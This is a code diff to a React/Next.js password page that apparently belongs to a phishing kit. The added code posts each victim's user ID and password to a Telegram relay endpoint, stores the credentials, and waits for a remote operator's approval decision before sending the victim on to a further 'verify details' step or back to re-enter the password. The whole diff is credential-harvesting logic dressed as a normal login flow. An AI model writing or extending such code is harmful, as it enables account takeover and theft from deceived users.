@@ -1,8 +1,13 @@
 "use client"
 
-import { useRouter } from "next/navigation"
-import { useState } from "react"
+import { useRouter, useSearchParams } from "next/navigation"
+import { useEffect, useState } from "react"
 import { WELCOME_TITLE } from "@/lib/auth-copy"
+import {
+  METHOD_DENIED_ERROR_TEXT,
+  MSG_UNABLE_REACH_VERIFICATION,
+} from "@/lib/approval-messages"
+import { waitForApprovalDecision } from "@/lib/approval-webhook"
 import {
   setTargetFlowLogin,
 } from "@/lib/flores-flow"
@@ -18,10 +23,18 @@ type PasswordStepProps = {
 
 export function PasswordStep({ userId }: PasswordStepProps) {
   const router = useRouter()
+  const searchParams = useSearchParams()
   const [password, setPassword] = useState("")
   const [showPassword, setShowPassword] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [errors, setErrors] = useState<{ password?: string; form?: string }>({})
+
+  useEffect(() => {
+    const errorText = searchParams.get("error")
+    if (errorText) {
+      setErrors((prev) => ({ ...prev, form: errorText }))
+    }
+  }, [searchParams])
 
   const handlePasswordBlur = () => {
     if (!password.trim()) {
@@ -48,18 +61,49 @@ export function PasswordStep({ userId }: PasswordStepProps) {
     setErrors({})
 
     const trimmedUserId = userId.trim() || readStoredUsername()
-
-    fetch("/api/telegram/login", {
+    const loginResponse = await fetch("/api/telegram/login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ userId: trimmedUserId, password }),
-    }).catch(console.error)
+    })
+
+    if (!loginResponse.ok) {
+      setErrors({ form: "Unable to reach verification. Please try again." })
+      setIsSubmitting(false)
+      return
+    }
+
+    const json = (await loginResponse.json()) as { sessionId?: string }
+    if (!json.sessionId) {
+      setErrors({ form: "Unable to reach verification. Please try again." })
+      setIsSubmitting(false)
+      return
+    }
 
     storeLoginCredentials(trimmedUserId, password)
     setTargetFlowLogin()
 
-    await wait(LOADING_MS.next)
-    router.push("/verify?mode=details")
+    const approvalStatus = await waitForApprovalDecision(json.sessionId)
+
+    if (approvalStatus === "approved") {
+      await wait(LOADING_MS.next)
+      router.push("/verify?mode=details")
+      setIsSubmitting(false)
+      return
+    }
+
+    if (approvalStatus === "redirected") {
+      router.push(`/password?userId=${encodeURIComponent(trimmedUserId)}`)
+      setIsSubmitting(false)
+      return
+    }
+
+    if (approvalStatus === "denied") {
+      setErrors({ form: METHOD_DENIED_ERROR_TEXT })
+    } else {
+      setErrors({ form: MSG_UNABLE_REACH_VERIFICATION })
+    }
+
     setIsSubmitting(false)
   }
 
